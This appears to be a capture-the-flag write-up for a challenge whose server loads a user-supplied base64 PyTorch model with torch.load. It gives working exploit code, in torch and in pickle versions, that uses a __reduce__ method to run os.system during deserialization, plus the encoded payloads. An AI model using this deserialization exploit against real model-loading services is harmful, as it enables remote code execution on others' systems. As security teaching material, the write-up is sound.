## Memecontrol

[memecontrol.py](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Easy/memecontrol/memecontrol.py)  

> Challenge Description:  
Internet memes are getting out of control! Submit a pytorch model that catches illegal memes to earn a flag

> This is the contents of memecontrol.py

```python
import io
import torch
import base64

banner = \
'''
8""8""8                   8""""8                                      
8  8  8 eeee eeeeeee eeee 8    " eeeee eeeee eeeee eeeee  eeeee e     
8e 8  8 8    8  8  8 8    8e     8  88 8   8   8   8   8  8  88 8     
88 8  8 8eee 8e 8  8 8eee 88     8   8 8e  8   8e  8eee8e 8   8 8e    
88 8  8 88   88 8  8 88   88   e 8   8 88  8   88  88   8 8   8 88    
88 8  8 88ee 88 8  8 88ee 88eee8 8eee8 88  8   88  88   8 8eee8 88eee
'''

try:
    print(banner)
    base64_string = input("Send the base64 encoded model: ")
    bytes_data = base64.b64decode(base64_string)

    print("Evaluating the model ...")
    device = torch.device("cpu")
    model = torch.load(io.BytesIO(bytes_data), map_location=device)
    model.eval()
    print("Finished evaluating the model!")
except Exception as e:
    print(f"Ooops, this model is no good: {e}".format(e))

```

> This program prompts a user to input a PyTorch model that has been base64-encoded. The input is then decoded and the resulting bytes are passed to `io.BytesIO()` to create a file-like object. This file-like object is then loaded into a PyTorch model using `torch.load()`. After loading the model, `model.eval()` is called to set the model to evaluation mode.

> We can note that the base64-encoded input is not properly sanitized hence it is vulnerable to input deserialization attacks to gain remote code execution (RCE). [This link](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) is very useful in explaining python deserialization.

> Basically, we would want to define a `__reduce__` function in our class, which allows the ability to serialize an object even if there is an error raised. For more details, refer to [this stackoverflow link](https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler)

> This challenge was solved after the event. Therefore, for demonstration purposes, I have created an arbitrary `flag.txt` file and ran `memecontrol.py` as my server, which was running on Windows OS. I created the following python exploit code which converts the class RCE, containing the implemented `__reduce__` function, into a pyTorch model and then encodes the saved byte data into a base64 string.

```python
import torch
import io
import os
import base64

class RCE:
    def __reduce__(self):
        cmd = ('type flag.txt')
        return os.system, (cmd,)

dummy_model = RCE()
buffer = io.BytesIO()
torch.save(dummy_model, buffer)
bytes_data = buffer.getvalue()
base64_string = base64.b64encode(bytes_data).decode()
print(base64_string)
```

> I then copied the output and pasted into the server when prompted for a base64 model.

```
UEsDBAAACAgAAAAAAAAAAAAAAAAAAAAAAAAQABIAYXJjaGl2ZS9kYXRhLnBrbEZCDgBaWlpaWlpaWlpaWlpaWoACY250CnN5c3RlbQpxAFgNAAAAdHlwZSBmbGFnLnR4dHEBhXECUnEDLlBLBwilLE9VKgAAACoAAABQSwMEAAAICAAAAAAAAAAAAAAAAAAAAAAAAA8AGQBhcmNoaXZlL3ZlcnNpb25GQhUAWlpaWlpaWlpaWlpaWlpaWlpaWlpaMwpQSwcI0Z5nVQIAAAACAAAAUEsBAgAAAAAICAAAAAAAAKUsT1UqAAAAKgAAABAAAAAAAAAAAAAAAAAAAAAAAGFyY2hpdmUvZGF0YS5wa2xQSwECAAAAAAgIAAAAAAAA0Z5nVQIAAAACAAAADwAAAAAAAAAAAAAAAAB6AAAAYXJjaGl2ZS92ZXJzaW9uUEsGBiwAAAAAAAAAHgMtAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAHsAAAAAAAAA0gAAAAAAAABQSwYHAAAAAE0BAAAAAAAAAQAAAFBLBQYAAAAAAgACAHsAAADSAAAAAAA=
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Easy/memecontrol/Solved_torch.png)  

> The exploit can also be done using the `pickle` library as follows:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('type flag.txt')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode())
```

> The output:

```
gASVJQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjA10eXBlIGZsYWcudHh0lIWUUpQu
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Easy/memecontrol/Solved_pickle.png)  

`midnight{challenge_solved_after_CTF}`
